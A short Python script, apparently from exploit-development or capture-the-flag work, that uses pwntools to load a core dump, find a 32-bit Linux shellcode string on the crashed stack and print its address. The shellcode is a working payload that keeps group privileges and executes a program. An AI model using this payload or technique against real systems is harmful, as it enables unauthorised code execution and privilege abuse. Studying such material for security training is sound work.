#!/usr/bin/env python

from pwn import *

c = Core('core')

shellcode = 'j2X\xcd\x80PP[YjGX\xcd\x80j\x0bX\x99RjAT[1\xc9\xcd\x80'
addr = c.stack.find(shellcode)

print(hex(addr))
